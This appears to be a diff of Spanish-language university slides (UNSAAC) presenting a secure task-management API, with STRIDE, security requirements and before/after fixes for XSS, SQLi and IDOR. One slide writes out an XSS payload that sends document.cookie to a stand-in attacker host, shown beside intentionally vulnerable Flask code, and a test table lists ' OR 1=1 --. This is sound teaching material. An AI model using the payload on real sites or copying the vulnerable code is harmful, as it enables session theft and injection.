-<div class="slide">
-  <div class="slide-header">
-    <div class="flex items-center gap-3">
-      <span class="text-2xl">🟡</span>
-      <h2 class="text-xl font-bold tracking-wide">4. Propuesta de Código Seguro — XSS Reflected (CWE-79)</h2>
-    </div>
-    <span class="text-sm bg-white/20 px-3 py-1 rounded-full font-semibold">SAST: Bandit B201</span>
-  </div>
-
-  <div class="flex-1 px-16 py-6 flex flex-col justify-center max-w-7xl mx-auto w-full">
-    <div class="mb-4">
-      <p class="text-slate-600 text-sm">
-        <strong>Vulnerabilidad Identificada:</strong> Bandit reportó <code class="font-mono text-xs bg-slate-200 px-1 py-0.5 rounded">B201 (Flask render_template_string)</code> con severidad High al renderizar variables de texto directamente sin neutralizar etiquetas HTML.
-      </p>
-    </div>
-
-    <div class="grid grid-cols-2 gap-6 items-stretch">
-      <!-- ANTES -->
-      <div class="bg-white rounded-2xl p-5 shadow-md border-l-4 border-red-500 flex flex-col justify-between">
-        <div>
-          <div class="flex items-center justify-between mb-3">
-            <span class="text-xs font-bold text-red-600 uppercase tracking-wider flex items-center gap-1.5">
-              <span>❌</span> Código Vulnerable (Antes)
-            </span>
-            <span class="text-[0.7rem] bg-red-100 text-red-700 font-mono px-2 py-0.5 rounded">app_vulnerable.py</span>
-          </div>
-
-          <div class="code-container"><span class="kw">from</span> flask <span class="kw">import</span> render_template_string
-
-<span class="kw">@app</span>.<span class="fn">route</span>(<span class="str">"/comentario"</span>)
-<span class="kw">def</span> <span class="fn">mostrar_comentario</span>():
-    comentario = request.args.<span class="fn">get</span>(<span class="str">"texto"</span>, <span class="str">""</span>)
-
-    <span class="cmt"># ⛔ XSS: Renderiza HTML y scripts sin sanitizar</span>
-    <span class="bad">return render_template_string(
-        f"&lt;div&gt;Comentario: {comentario}&lt;/div&gt;"
-    )</span></div>
-        </div>
-
-        <div class="mt-4 bg-red-50 rounded-xl p-3 text-xs text-red-800 border border-red-200">
-          <strong>Impacto:</strong> Inyectar <code class="font-mono">&lt;script&gt;fetch('https://malicioso.com/?cookie='+document.cookie)&lt;/script&gt;</code> permite el robo de tokens de sesión activos de las víctimas.
-        </div>
-      </div>
-
-      <!-- DESPUÉS -->
-      <div class="bg-white rounded-2xl p-5 shadow-md border-l-4 border-emerald-500 flex flex-col justify-between">
-        <div>
-          <div class="flex items-center justify-between mb-3">
-            <span class="text-xs font-bold text-emerald-700 uppercase tracking-wider flex items-center gap-1.5">
-              <span>✅</span> Código Seguro Refactorizado (Después)
-            </span>
-            <span class="text-[0.7rem] bg-emerald-100 text-emerald-800 font-mono px-2 py-0.5 rounded">app_segura.py</span>
-          </div>
-
-          <div class="code-container"><span class="kw">from</span> markupsafe <span class="kw">import</span> escape
-
-<span class="kw">@app</span>.<span class="fn">route</span>(<span class="str">"/comentario"</span>)
-<span class="kw">def</span> <span class="fn">mostrar_comentario</span>():
-    comentario = request.args.<span class="fn">get</span>(<span class="str">"texto"</span>, <span class="str">""</span>)
-
-    <span class="cmt"># 🛡️ DEFENSIVO: escape() codifica entidades peligrosas</span>
-    <span class="good">safe_text = escape(comentario)
-    return f"&lt;div&gt;Comentario: {safe_text}&lt;/div&gt;"</span></div>
-        </div>
-
-        <div class="mt-4 bg-emerald-50 rounded-xl p-3 text-xs text-emerald-900 border border-emerald-200">
-          <strong>Solución Defensiva:</strong> Conversión de caracteres especiales (&lt; se transforma en &amp;lt;, &gt; en &amp;gt;). El navegador muestra el texto visualmente sin llegar a ejecutar el script.
-        </div>
-      </div>
-    </div>
-  </div>
-
-  <div class="slide-footer">
-    <span>Mini Dossier de Software Seguro • UNSAAC</span>
-    <span>Slide 13 / 24</span>
-  </div>
-</div>
-
-<!-- ══════════════════════════════════════════════════════════
-     SLIDE 14: PRUEBAS NEGATIVAS AUTOMATIZADAS
-═══════════════════════════════════════════════════════════ -->
-<div class="slide">
-  <div class="slide-header">
-    <div class="flex items-center gap-3">
-      <span class="text-2xl">🧪</span>
-      <h2 class="text-xl font-bold tracking-wide">4.1 Pruebas Negativas Automatizadas (Suite Pytest)</h2>
-    </div>
-    <span class="text-sm bg-white/20 px-3 py-1 rounded-full font-semibold">19 Tests • 100% Passing</span>
-  </div>
-
-  <div class="flex-1 px-16 py-6 flex flex-col justify-center max-w-7xl mx-auto w-full">
-    <div class="bg-white rounded-2xl shadow-md overflow-hidden border border-slate-200 mb-5">
-      <table class="table-modern">
-        <thead>
-          <tr>
-            <th class="w-36">Test Case</th>
-            <th>Vulnerabilidad Evaluada</th>
-            <th class="w-56">Vector / Payload Inyectado</th>
-            <th class="w-44">Respuesta del Sistema</th>
-            <th class="w-24 text-center">Resultado</th>
-          </tr>
-        </thead>
-        <tbody>
-          <tr>
-            <td class="font-mono text-xs font-bold text-violet-700">test_03_idor</td>
-            <td>Manipulación de objeto ajeno (IDOR)</td>
-            <td class="font-mono text-xs text-slate-600">DELETE /tasks/{id_ajeno}</td>
-            <td class="text-xs font-bold text-orange-600">HTTP 403 Forbidden</td>
-            <td class="text-center"><span class="bg-emerald-100 text-emerald-800 font-bold px-2.5 py-0.5 rounded-full text-xs">PASS</span></td>
-          </tr>
-          <tr>
-            <td class="font-mono text-xs font-bold text-violet-700">test_06_brute</td>
-            <td>Fuerza bruta continua en login</td>
-            <td class="font-mono text-xs text-slate-600">password_erronea × 4 intentos</td>
-            <td class="text-xs font-bold text-orange-600">HTTP 429 Too Many Requests</td>
-            <td class="text-center"><span class="bg-emerald-100 text-emerald-800 font-bold px-2.5 py-0.5 rounded-full text-xs">PASS</span></td>
-          </tr>
-          <tr>
-            <td class="font-mono text-xs font-bold text-violet-700">test_09_revoke</td>
-            <td>Replay de JWT tras cambio de clave</td>
-            <td class="font-mono text-xs text-slate-600">Token con token_version obsoleto</td>
-            <td class="text-xs font-bold text-red-600">HTTP 401 Unauthorized</td>
-            <td class="text-center"><span class="bg-emerald-100 text-emerald-800 font-bold px-2.5 py-0.5 rounded-full text-xs">PASS</span></td>
-          </tr>
-          <tr>
-            <td class="font-mono text-xs font-bold text-violet-700">test_14_mass</td>
-            <td>Inyección de atributos (Mass Assignment)</td>
-            <td class="font-mono text-xs text-slate-600">{"is_admin": true, "role": "admin"}</td>
-            <td class="text-xs font-bold text-red-600">HTTP 422 Unprocessable Entity</td>
-            <td class="text-center"><span class="bg-emerald-100 text-emerald-800 font-bold px-2.5 py-0.5 rounded-full text-xs">PASS</span></td>
-          </tr>
-          <tr>
-            <td class="font-mono text-xs font-bold text-violet-700">test_17_sqli</td>
-            <td>Inyección SQL clásica en buscador</td>
-            <td class="font-mono text-xs text-slate-600">' OR 1=1 --</td>
-            <td class="text-xs font-bold text-emerald-600">Retorna [] (0 registros filtrados)</td>
-            <td class="text-center"><span class="bg-emerald-100 text-emerald-800 font-bold px-2.5 py-0.5 rounded-full text-xs">PASS</span></td>
-          </tr>
-          <tr>
-            <td class="font-mono text-xs font-bold text-violet-700">test_18_null</td>
-            <td>Envío de valor nulo en campo mandatorio</td>
-            <td class="font-mono text-xs text-slate-600">{"title": null, "description": "..."}</td>
-            <td class="text-xs font-bold text-red-600">HTTP 422 Rechazo por DTO Pydantic</td>
-            <td class="text-center"><span class="bg-emerald-100 text-emerald-800 font-bold px-2.5 py-0.5 rounded-full text-xs">PASS</span></td>
-          </tr>
-        </tbody>
-      </table>
-    </div>
-
-    <div class="bg-slate-900 text-emerald-400 font-mono text-xs rounded-xl p-3.5 flex items-center justify-between border border-slate-700">
-      <div class="flex items-center gap-2">
-        <span class="w-3 h-3 rounded-full bg-emerald-500 inline-block animate-pulse"></span>
-        <span>pytest test_security.py -v --------------------------------------------</span>
-      </div>
-      <span class="font-bold text-white">19 passed in 9.67s (100% exitoso)</span>
-    </div>
-  </div>
-
-  <div class="slide-footer">
-    <span>Mini Dossier de Software Seguro • UNSAAC</span>
-    <span>Slide 14 / 24</span>
-  </div>
-</div>
-
-<!-- ══════════════════════════════════════════════════════════
-     SLIDE 15: CONCLUSIONES Y MÉTRICAS GLOBALES
-═══════════════════════════════════════════════════════════ -->
-<div class="slide">
-  <div class="slide-header">
-    <div class="flex items-center gap-3">
-      <span class="text-2xl">📊</span>
-      <h2 class="text-xl font-bold tracking-wide">5. Conclusiones — Métricas Cuantitativas de Seguridad</h2>
-    </div>
-    <span class="text-sm bg-white/20 px-3 py-1 rounded-full font-semibold">Resultados del Hardening</span>
-  </div>
-
-  <div class="flex-1 px-16 py-8 flex flex-col justify-center max-w-7xl mx-auto w-full">
-    <div class="grid grid-cols-4 gap-6 mb-8">
-      
-      <div class="bg-white rounded-2xl p-6 shadow-md border-t-4 border-emerald-500 text-center">
-        <p class="text-5xl font-black text-emerald-600 mb-1">19 / 19</p>
-        <p class="font-bold text-slate-800 text-base">Pruebas Pytest</p>
-        <p class="text-xs text-slate-500 mt-1">100% de tests de penetración y regresión superados sin fallos.</p>
-      </div>
-
-      <div class="bg-white rounded-2xl p-6 shadow-md border-t-4 border-blue-500 text-center">
-        <p class="text-5xl font-black text-blue-600 mb-1">0</p>
-        <p class="font-bold text-slate-800 text-base">Alertas Bandit</p>
-        <p class="text-xs text-slate-500 mt-1">Escaneo SAST limpio en app_segura.py y main.py.</p>
-      </div>
-
-      <div class="bg-white rounded-2xl p-6 shadow-md border-t-4 border-indigo-500 text-center">
-        <p class="text-5xl font-black text-indigo-600 mb-1">3 / 3</p>
-        <p class="font-bold text-slate-800 text-base">Vulnerabilidades Mitigadas</p>
-        <p class="text-xs text-slate-500 mt-1">SQLi (CWE-89), IDOR (CWE-284) y XSS (CWE-79) neutralizadas.</p>
-      </div>
-
-      <div class="bg-white rounded-2xl p-6 shadow-md border-t-4 border-violet-500 text-center">
-        <p class="text-5xl font-black text-violet-600 mb-1">6</p>
-        <p class="font-bold text-slate-800 text-base">Fases SSDLC</p>
-        <p class="text-xs text-slate-500 mt-1">Desde modelado STRIDE hasta auditoría en producción.</p>
-      </div>
-
-    </div>
-
-    <div class="bg-white rounded-2xl p-6 shadow-md border border-slate-200">
-      <h4 class="font-bold text-slate-800 text-base mb-3">Balance del Proyecto:</h4>
-      <p class="text-slate-600 text-sm leading-relaxed">
-        El desarrollo del presente laboratorio demostró que la seguridad no puede ser considerada como una etapa decorativa final. Al aplicar la filosofía <strong>Shift-Left</strong>, se erradicaron debilidades críticas antes del despliegue en la nube, entregando una API robusta, respaldada por especificaciones OpenAPI / Swagger, middleware de seguridad activo y suites automatizadas de testing defensivo.
-      </p>
-    </div>
-  </div>
-
-  <div class="slide-footer">
-    <span>Mini Dossier de Software Seguro • UNSAAC</span>
-    <span>Slide 15 / 24</span>
-  </div>
-</div>
-
-<!-- ══════════════════════════════════════════════════════════
-     SLIDE 16: REFLEXIÓN DEL EQUIPO
-═══════════════════════════════════════════════════════════ -->
-<div class="slide">
-  <div class="slide-header">
-    <div class="flex items-center gap-3">
-      <span class="text-2xl">💡</span>
-      <h2 class="text-xl font-bold tracking-wide">5. Conclusiones — Reflexión Técnica del Equipo</h2>
-    </div>
-    <span class="text-sm bg-white/20 px-3 py-1 rounded-full font-semibold">Lecciones Aprendidas</span>
-  </div>
-
-  <div class="flex-1 px-16 py-8 flex items-center max-w-7xl mx-auto w-full">
-    <div class="grid grid-cols-2 gap-6 w-full">
-      
-      <div class="bg-white rounded-2xl p-6 shadow-md border-l-4 border-blue-600">
-        <div class="flex items-center gap-3 mb-2">
-          <span class="text-2xl">🛡️</span>
-          <h4 class="font-bold text-slate-800 text-base">Eficacia del Modelado de Amenazas</h4>
-        </div>
-        <p class="text-slate-600 text-xs leading-relaxed">
-          El análisis preliminar con STRIDE permitió evidenciar vectores como IDOR que los frameworks modernos no mitigan por defecto. Definir el ownership a nivel de entidad protegió las operaciones críticas de borrado y edición desde la raíz arquitectónica.
+      <!-- Título del Software -->
+      <div class="my-auto">
+        <span class="text-xs uppercase font-bold tracking-widest text-red-600 bg-red-50 px-3 py-1 rounded-full border border-red-200">
+          Tarea 4.1 • Mini Dossier de Software Seguro
+        </span>
+        <h1 class="text-4xl font-black text-[#0f2b48] mt-3 leading-tight">
+          Titulo: Gestión de Tareas API (Software Seguro)
+        </h1>
+        <p class="text-base text-slate-600 font-medium mt-2">
+          Ciclo de Vida de Desarrollo Seguro (SSDLC), Análisis STRIDE y Hardening Defensivo
         </p>
       </div>
 
-      <div class="bg-white rounded-2xl p-6 shadow-md border-l-4 border-indigo-600">
-        <div class="flex items-center gap-3 mb-2">
-          <span class="text-2xl">🔍</span>
-          <h4 class="font-bold text-slate-800 text-base">Valor del Análisis Estático (SAST)</h4>
+      <!-- Integrantes y Equipo -->
+      <div class="border-t border-slate-200 pt-6">
+        <h3 class="text-xl font-black text-[#0f2b48] tracking-wide mb-2">EQUIPO: EQUIPO 02</h3>
+        <p class="text-sm font-bold text-slate-700">INTEGRANTES:</p>
+        <p class="text-xs text-slate-600 mt-1">Estudiantes de la Escuela Profesional de Ingeniería Informática y de Sistemas (UNSAAC)</p>
+        <div class="flex gap-6 mt-3 text-xs font-mono">
+          <span class="text-blue-700 font-bold">Docente: Ing. Alex Fernando Huillca Huaman</span>
+          <span class="text-emerald-700 font-bold">Producción: practica-4-ingenieria-de-software-ii.onrender.com</span>
         </div>
-        <p class="text-slate-600 text-xs leading-relaxed">
-          Herramientas como Bandit y Pylint aportaron objetividad inmediata. Señalaron con precisión quirúrgica el uso de variables desatendidas (<code class="font-mono text-[0.7rem]">W0612</code>) y sentencias SQL vulnerables (<code class="font-mono text-[0.7rem]">B608</code>), agilizando las refactorizaciones.
-        </p>
       </div>
-
-      <div class="bg-white rounded-2xl p-6 shadow-md border-l-4 border-violet-600">
-        <div class="flex items-center gap-3 mb-2">
-          <span class="text-2xl">🧪</span>
-          <h4 class="font-bold text-slate-800 text-base">Testing Negativo como Red de Seguridad</h4>
-        </div>
-        <p class="text-slate-600 text-xs leading-relaxed">
-          Validar únicamente casos felices no garantiza software seguro. Las 19 pruebas de penetración automatizadas simularon ataques reales, asegurando que cualquier cambio futuro mantenga intactas las barreras contra inyecciones y accesos ilegítimos.
-        </p>
-      </div>
-
-      <div class="bg-white rounded-2xl p-6 shadow-md border-l-4 border-emerald-600">
-        <div class="flex items-center gap-3 mb-2">
-          <span class="text-2xl">🌐</span>
-          <h4 class="font-bold text-slate-800 text-base">Observabilidad y Hardening en Producción</h4>
-        </div>
-        <p class="text-slate-600 text-xs leading-relaxed">
-          El despliegue en Render con HTTPS forzado, sumado a cabeceras de seguridad estrictas (HSTS, CSP) y logging con omisión de credenciales, consolidó un entorno observable listo para operar bajo estándares profesionales OWASP.
-        </p>
-      </div>
-
     </div>
-  </div>
-
-  <div class="slide-footer">
-    <span>Mini Dossier de Software Seguro • UNSAAC</span>
-    <span>Slide 16 / 24</span>
   </div>
 </div>
 
-<!-- ══════════════════════════════════════════════════════════
-     SLIDE 17: EVIDENCIAS - AUTENTICACIÓN Y LOGIN
-═══════════════════════════════════════════════════════════ -->
-<div class="slide">
-  <div class="slide-header">
-    <div class="flex items-center gap-3">
-      <span class="text-2xl">📸</span>
-      <h2 class="text-xl font-bold tracking-wide">5.1 Evidencias — Autenticación y Pantallas de Login</h2>
+<!-- =========================================================================
+     SLIDE 2: ÍNDICE OFICIAL
+========================================================================== -->
+<div class="slide bg-white">
+  <div class="flex-1 flex items-center px-16 max-w-7xl mx-auto w-full">
+    <!-- Lado Izquierdo: Título ÍNDICE -->
+    <div class="w-1/3 flex flex-col justify-center border-r-4 border-red-600 pr-12">
+      <h1 class="text-7xl font-black text-[#0f2b48] tracking-tight">ÍNDICE</h1>
+      <p class="text-sm font-bold text-slate-400 uppercase tracking-widest mt-2">Mini Dossier SSDLC</p>
     </div>
-    <span class="text-sm bg-white/20 px-3 py-1 rounded-full font-semibold">Capturas del Software</span>
-  </div>
 
-  <div class="flex-1 px-16 py-6 flex flex-col justify-center max-w-7xl mx-auto w-full">
-    <div class="grid grid-cols-2 gap-8 items-center">
-      <div class="bg-white rounded-2xl p-4 shadow-md border border-slate-200">
-        <img src="CAPTURAS DE PANTALLA DEL SOFTWARE/LOGIN.png" alt="Login" class="w-full h-72 object-contain rounded-xl bg-slate-50 border border-slate-100" />
-        <div class="mt-3 text-center">
-          <p class="font-bold text-slate-800 text-sm">Pantalla Inicial de Autenticación</p>
-          <p class="text-xs text-slate-500">Interfaz principal de login con validación de credenciales JWT y soporte RBAC.</p>
-        </div>
-      </div>
-
-      <div class="bg-white rounded-2xl p-4 shadow-md border border-slate-200">
-        <img src="CAPTURAS DE PANTALLA DEL SOFTWARE/inicio de sesion.png" alt="Inicio Sesión" class="w-full h-72 object-contain rounded-xl bg-slate-50 border border-slate-100" />
-        <div class="mt-3 text-center">
-          <p class="font-bold text-slate-800 text-sm">Inicio de Sesión Exitoso</p>
-          <p class="text-xs text-slate-500">Generación de token JWT, asignación de rol y redirección protegida a la app.</p>
-        </div>
-      </div>
+    <!-- Lado Derecho: Contenido -->
+    <div class="w-2/3 pl-16">
+      <h2 class="text-2xl font-bold text-[#0f2b48] mb-6">Contenido</h2>
+      <ul class="space-y-5 text-xl font-bold text-slate-800">
+        <li class="flex items-center gap-4 hover:translate-x-2 transition-transform">
+          <span class="w-10 h-10 rounded-xl bg-blue-50 text-blue-800 flex items-center justify-center font-black text-sm border border-blue-200">1</span>
+          <span>1.- Mapa SSDLC</span>
+        </li>
+        <li class="flex items-center gap-4 hover:translate-x-2 transition-transform">
+          <span class="w-10 h-10 rounded-xl bg-blue-50 text-blue-800 flex items-center justify-center font-black text-sm border border-blue-200">2</span>
+          <span>2.- Requisitos de seguridad</span>
+        </li>
+        <li class="flex items-center gap-4 hover:translate-x-2 transition-transform">
+          <span class="w-10 h-10 rounded-xl bg-blue-50 text-blue-800 flex items-center justify-center font-black text-sm border border-blue-200">3</span>
+          <span>3.- Matriz de riesgos</span>
+        </li>
+        <li class="flex items-center gap-4 hover:translate-x-2 transition-transform">
+          <span class="w-10 h-10 rounded-xl bg-blue-50 text-blue-800 flex items-center justify-center font-black text-sm border border-blue-200">4</span>
+          <span>4.- Propuesta de código seguro</span>
+        </li>
+        <li class="flex items-center gap-4 hover:translate-x-2 transition-transform">
+          <span class="w-10 h-10 rounded-xl bg-blue-50 text-blue-800 flex items-center justify-center font-black text-sm border border-blue-200">5</span>
+          <span>5.- Conclusiones y evidencias</span>
+        </li>
+      </ul>
     </div>
-  </div>
-
-  <div class="slide-footer">
-    <span>Mini Dossier de Software Seguro • UNSAAC</span>
-    <span>Slide 17 / 24</span>
   </div>
 </div>
 
-<!-- ══════════════════════════════════════════════════════════
-     SLIDE 18: EVIDENCIAS - VALIDACIÓN DE SEGURIDAD
-═══════════════════════════════════════════════════════════ -->
-<div class="slide">
-  <div class="slide-header">
-    <div class="flex items-center gap-3">
-      <span class="text-2xl">🛡️</span>
-      <h2 class="text-xl font-bold tracking-wide">5.2 Evidencias — Controles de Seguridad y Denegación</h2>
-    </div>
-    <span class="text-sm bg-white/20 px-3 py-1 rounded-full font-semibold">Capturas del Software</span>
+<!-- =========================================================================
+     SLIDE 3: 1.- MAPA SSDLC
+========================================================================== -->
+<div class="slide bg-white p-8 flex flex-col justify-between">
+  <!-- Banner superior azul marino -->
+  <div class="w-full bg-[#0e3860] py-3.5 rounded-2xl text-center shadow-md">
+    <h1 class="text-2xl font-black text-white tracking-wide uppercase">
+      MAPA SSDLC: GESTIÓN DE TAREAS API
+    </h1>
   </div>
 
-  <div class="flex-1 px-16 py-6 flex flex-col justify-center max-w-7xl mx-auto w-full">
-    <div class="grid grid-cols-3 gap-6">
-      <div class="bg-white rounded-2xl p-4 shadow-md border border-slate-200">
-        <img src="CAPTURAS DE PANTALLA DEL SOFTWARE/seguridad en el inicio de sesion.png" alt="Seguridad" class="w-full h-60 object-contain rounded-xl bg-slate-50 border border-slate-100" />
-        <p class="font-bold text-slate-800 text-xs text-center mt-2.5">Medidas Activas en Login</p>
-        <p class="text-[0.7rem] text-slate-500 text-center">Protección contra inyecciones y rate limiting.</p>
-      </div>
-
-      <div class="bg-white rounded-2xl p-4 shadow-md border border-slate-200">
-        <img src="CAPTURAS DE PANTALLA DEL SOFTWARE/denegacion al inicio de sesion de usuarios no creados.png" alt="Denegación" class="w-full h-60 object-contain rounded-xl bg-slate-50 border border-slate-100" />
-        <p class="font-bold text-slate-800 text-xs text-center mt-2.5">Denegación de Acceso</p>
-        <p class="text-[0.7rem] text-slate-500 text-center">Respuesta defensiva sin enumeración de usuarios.</p>
-      </div>
-
-      <div class="bg-white rounded-2xl p-4 shadow-md border border-slate-200">
-        <img src="CAPTURAS DE PANTALLA DEL SOFTWARE/error en la cracion de la contraseña-debe ser segura.png" alt="Validación Password" class="w-full h-60 object-contain rounded-xl bg-slate-50 border border-slate-100" />
-        <p class="font-bold text-slate-800 text-xs text-center mt-2.5">Política de Contraseña Fuerte</p>
-        <p class="text-[0.7rem] text-slate-500 text-center">Requisito obligatorio de complejidad y longitud.</p>
+  <!-- 6 Etapas con diseño serpenteante -->
+  <div class="grid grid-cols-2 gap-5 my-auto px-6">
+    <div class="border-2 border-[#0e3860] rounded-2xl p-4 bg-slate-50 flex items-start gap-4">
+      <div class="w-12 h-12 rounded-xl bg-[#0e3860] text-white flex items-center justify-center font-black text-lg flex-shrink-0">1</div>
+      <div>
+        <h4 class="font-bold text-[#0e3860] text-base">1. Requisitos: DTOs Pydantic y Especificación Formal</h4>
+        <p class="text-xs text-slate-600 mt-1">Configuración <code class="font-mono bg-white px-1 rounded">extra='forbid'</code>, tipos de datos estrictos y 5 requisitos verificables.</p>
       </div>
     </div>
+
+    <div class="border-2 border-[#0e3860] rounded-2xl p-4 bg-slate-50 flex items-start gap-4">
+      <div class="w-12 h-12 rounded-xl bg-[#0e3860] text-white flex items-center justify-center font-black text-lg flex-shrink-0">2</div>
+      <div>
+        <h4 class="font-bold text-[#0e3860] text-base">2. Diseño: Modelado STRIDE y Lógica RBAC</h4>
+        <p class="text-xs text-slate-600 mt-1">Delimitación de Trust Boundaries, tokens JWT con <code class="font-mono bg-white px-1 rounded">jti (UUIDv4)</code> y roles admin/docente/estudiante.</p>
+      </div>
+    </div>
+
+    <div class="border-2 border-[#0e3860] rounded-2xl p-4 bg-slate-50 flex items-start gap-4">
+      <div class="w-12 h-12 rounded-xl bg-[#0e3860] text-white flex items-center justify-center font-black text-lg flex-shrink-0">3</div>
+      <div>
+        <h4 class="font-bold text-[#0e3860] text-base">3. Desarrollo: Consultas Parametrizadas y SAST</h4>
+        <p class="text-xs text-slate-600 mt-1">Prepared Statements con placeholder <code class="font-mono bg-white px-1 rounded">?</code>, bcrypt(12) y escaneo continuo con Bandit (0 alertas).</p>
+      </div>
+    </div>
+
+    <div class="border-2 border-[#0e3860] rounded-2xl p-4 bg-slate-50 flex items-start gap-4">
+      <div class="w-12 h-12 rounded-xl bg-[#0e3860] text-white flex items-center justify-center font-black text-lg flex-shrink-0">4</div>
+      <div>
+        <h4 class="font-bold text-[#0e3860] text-base">4. Pruebas: Control IDOR y Pruebas Automatizadas</h4>
+        <p class="text-xs text-slate-600 mt-1">Verificación a nivel de fila <code class="font-mono bg-white px-1 rounded">owner_id == user_id</code> y suite de 19 pruebas pytest (100% PASS).</p>
+      </div>
+    </div>
+
+    <div class="border-2 border-[#0e3860] rounded-2xl p-4 bg-slate-50 flex items-start gap-4">
+      <div class="w-12 h-12 rounded-xl bg-[#0e3860] text-white flex items-center justify-center font-black text-lg flex-shrink-0">5</div>
+      <div>
+        <h4 class="font-bold text-[#0e3860] text-base">5. Despliegue: Hardening, TLS/HTTPS y Headers</h4>
+        <p class="text-xs text-slate-600 mt-1">Infraestructura Render con cifrado TLS forzado, cabeceras HSTS/CSP/X-Frame y CORS restrictivo.</p>
+      </div>
+    </div>
+
+    <div class="border-2 border-[#0e3860] rounded-2xl p-4 bg-slate-50 flex items-start gap-4">
+      <div class="w-12 h-12 rounded-xl bg-[#0e3860] text-white flex items-center justify-center font-black text-lg flex-shrink-0">6</div>
+      <div>
+        <h4 class="font-bold text-[#0e3860] text-base">6. Mantenimiento: Monitoreo audit.log y Revocación</h4>
+        <p class="text-xs text-slate-600 mt-1">Trazabilidad forense sin credenciales y revocación global mediante <code class="font-mono bg-white px-1 rounded">token_version</code>.</p>
+      </div>
+    </div>
   </div>
 
-  <div class="slide-footer">
-    <span>Mini Dossier de Software Seguro • UNSAAC</span>
-    <span>Slide 18 / 24</span>
-  </div>
+  <div class="text-center text-xs text-slate-400">UNSAAC • Metodología Shift-Left • Mini Dossier de Software Seguro</div>
 </div>
 
-<!-- ══════════════════════════════════════════════════════════
-     SLIDE 19: EVIDENCIAS - REGISTRO Y GESTIÓN DE TAREAS
-═══════════════════════════════════════════════════════════ -->
-<div class="slide">
-  <div class="slide-header">
-    <div class="flex items-center gap-3">
-      <span class="text-2xl">📋</span>
-      <h2 class="text-xl font-bold tracking-wide">5.3 Evidencias — Registro de Cuentas y Creación de Tareas</h2>
-    </div>
-    <span class="text-sm bg-white/20 px-3 py-1 rounded-full font-semibold">Capturas del Software</span>
+<!-- =========================================================================
+     SLIDE 4: 2.- REQUISITOS DE SEGURIDAD (Estilo Píldoras Imagen 5)
+========================================================================== -->
+<div class="slide bg-white p-8 flex flex-col justify-between">
+  <div>
+    <h1 class="text-3xl font-black text-[#0f2b48] text-center tracking-tight leading-snug">
+      REQUISITOS DE SEGURIDAD<br/>VERIFICABLES
+    </h1>
+    <div class="w-full h-1 bg-red-600 mt-3 mb-6"></div>
   </div>
 
-  <div class="flex-1 px-16 py-6 flex flex-col justify-center max-w-7xl mx-auto w-full">
-    <div class="grid grid-cols-3 gap-6">
-      <div class="bg-white rounded-2xl p-4 shadow-md border border-slate-200">
-        <img src="CAPTURAS DE PANTALLA DEL SOFTWARE/creacion de cuenta.png" alt="Crear Cuenta" class="w-full h-60 object-contain rounded-xl bg-slate-50 border border-slate-100" />
-        <p class="font-bold text-slate-800 text-xs text-center mt-2.5">Formulario de Registro</p>
-        <p class="text-[0.7rem] text-slate-500 text-center">Validación de DTO y asignación controlada de rol.</p>
-      </div>
-
-      <div class="bg-white rounded-2xl p-4 shadow-md border border-slate-200">
-        <img src="CAPTURAS DE PANTALLA DEL SOFTWARE/confirmacion de la creacion de la cuenta.png" alt="Confirmar Cuenta" class="w-full h-60 object-contain rounded-xl bg-slate-50 border border-slate-100" />
-        <p class="font-bold text-slate-800 text-xs text-center mt-2.5">Confirmación de Registro</p>
-        <p class="text-[0.7rem] text-slate-500 text-center">Almacenamiento seguro con hash bcrypt(12).</p>
-      </div>
-
-      <div class="bg-white rounded-2xl p-4 shadow-md border border-slate-200">
-        <img src="CAPTURAS DE PANTALLA DEL SOFTWARE/creacion de tarea.png" alt="Crear Tarea" class="w-full h-60 object-contain rounded-xl bg-slate-50 border border-slate-100" />
-        <p class="font-bold text-slate-800 text-xs text-center mt-2.5">Creación Segura de Tarea</p>
-        <p class="text-[0.7rem] text-slate-500 text-center">Asignación automática de owner_id desde el JWT.</p>
+  <!-- 5 Tarjetas en píldora con escudo -->
+  <div class="space-y-3 px-8 my-auto">
+    <div class="pill-card p-3.5 flex items-center gap-4 text-white shadow-md">
+      <div class="w-12 h-12 rounded-2xl bg-red-600 flex items-center justify-center text-xl flex-shrink-0 shadow-inner">🛡️</div>
+      <div>
+        <h3 class="text-base font-bold">REQ-SEC-01: Control de acceso anti-IDOR en tareas - Crítica</h3>
+        <p class="text-xs text-slate-300">Validación obligatoria de pertenencia. Intento de borrado/modificación ajeno retorna HTTP 403 Forbidden. (Test: test_03_idor)</p>
       </div>
     </div>
+
+    <div class="pill-card p-3.5 flex items-center gap-4 text-white shadow-md">
+      <div class="w-12 h-12 rounded-2xl bg-red-600 flex items-center justify-center text-xl flex-shrink-0 shadow-inner">🛡️</div>
+      <div>
+        <h3 class="text-base font-bold">REQ-SEC-02: Prevención de Inyección SQL con Prepared Statements - Crítica</h3>
+        <p class="text-xs text-slate-300">Consultas parametrizadas con '?'. Búsqueda con ' OR 1=1 -- retorna lista vacía [] con HTTP 200. (Test: test_17_sqli)</p>
+      </div>
+    </div>
+
+    <div class="pill-card p-3.5 flex items-center gap-4 text-white shadow-md">
+      <div class="w-12 h-12 rounded-2xl bg-red-600 flex items-center justify-center text-xl flex-shrink-0 shadow-inner">🛡️</div>
+      <div>
+        <h3 class="text-base font-bold">REQ-SEC-03: Almacenamiento seguro con hash bcrypt (costo 12) - Crítica</h3>
+        <p class="text-xs text-slate-300">Contraseñas protegidas mediante derivación robusta con prefijo $2b$12$. Nunca en texto plano. (Test: test_01_register)</p>
+      </div>
+    </div>
+
+    <div class="pill-card p-3.5 flex items-center gap-4 text-white shadow-md">
+      <div class="w-12 h-12 rounded-2xl bg-orange-600 flex items-center justify-center text-xl flex-shrink-0 shadow-inner">🛡️</div>
+      <div>
+        <h3 class="text-base font-bold">REQ-SEC-04: Rate Limiting progresivo anti-fuerza bruta - Alta</h3>
+        <p class="text-xs text-slate-300">Bloqueo temporal progresivo (30s y 180s). El 4.º intento consecutivo retorna HTTP 429 con retry-after. (Test: test_06_brute)</p>
+      </div>
+    </div>
+
+    <div class="pill-card p-3.5 flex items-center gap-4 text-white shadow-md">
+      <div class="w-12 h-12 rounded-2xl bg-orange-600 flex items-center justify-center text-xl flex-shrink-0 shadow-inner">🛡️</div>
+      <div>
+        <h3 class="text-base font-bold">REQ-SEC-05: Revocación global de sesiones por token_version - Alta</h3>
+        <p class="text-xs text-slate-300">Invalidación inmediata de JWT antiguos tras cambiar la contraseña (HTTP 401 Unauthorized). (Test: test_09_revoke)</p>
+      </div>
+    </div>
   </div>
 
-  <div class="slide-footer">
-    <span>Mini Dossier de Software Seguro • UNSAAC</span>
-    <span>Slide 19 / 24</span>
-  </div>
